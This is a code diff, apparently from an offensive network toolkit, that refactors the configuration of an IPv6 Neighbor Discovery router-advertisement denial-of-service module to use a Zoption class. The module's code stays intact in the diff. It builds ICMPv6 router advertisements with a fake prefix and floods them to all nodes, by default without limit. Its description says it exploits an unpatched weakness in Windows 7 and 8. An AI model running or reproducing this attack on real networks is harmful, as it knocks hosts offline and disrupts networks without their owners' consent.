@@ -3,6 +3,7 @@ from time import sleep
 from scapy.all import *
 from dos import DoS
 from threading import Thread
+from zoption import Zoption
 
 
 class ndp_dos(DoS):
@@ -21,18 +22,18 @@ class ndp_dos(DoS):
         super(ndp_dos, self).__init__('IPv6 Neighbor Discovery Protocol RA DoS')
         conf.verb = 0
         self.config.pop("target", None)
-        self.config.update({"interval":{"type":"int", 
-                                        "value":0.1,
-                                        "required":False, 
-                                  "display":"Interval to send advertisements"},
-                            "prefix":{"type":"str", 
-                                      "value":"ba11:a570::",
-                                      "required":False, 
-                                      "display":"Fake router IPv6 address"},
-                            "count":{"type":"int", 
-                                     "value":-1,
-                                     "required":False,
-                  "display":"Number of advertisements to send (-1 infinite)"}
+        self.config.update({"interval":Zoption(type = "int", 
+                                               value = 0.1,
+                                               required = False, 
+                                  display = "Interval to send advertisements"),
+                            "prefix":Zoption(type = "str", 
+                                      value = "ba11:a570::",
+                                      required = False, 
+                                      display = "Fake router IPv6 address"),
+                            "count":Zoption(type = "int", 
+                                     value = -1,
+                                     required = False,
+                  display = "Number of advertisements to send (-1 infinite)")
                            })
         self.info = """
                     Exploits an unpatched vulnerability in the way Windows 7/8 handle
@@ -57,15 +58,15 @@ class ndp_dos(DoS):
         pkt = IPv6(dst='ff02::1')
         pkt /= ICMPv6ND_RA()
         pkt /= ICMPv6NDOptPrefixInfo(prefixlen=64, 
-                prefix=self.config['prefix']['value'])
+                prefix=self.config['prefix'].value)
 
         cnt = 0
         while self.running:
-            if self.config['count']['value'] > 0 and \
-                                    cnt >= self.config['count']['value']:
+            if self.config['count'].value > 0 and \
+                                    cnt >= self.config['count'].value:
                 self.running = False
                 break
 
             send(pkt)
             cnt += 1
-            sleep(self.config['interval']['value'])
+            sleep(self.config['interval'].value)
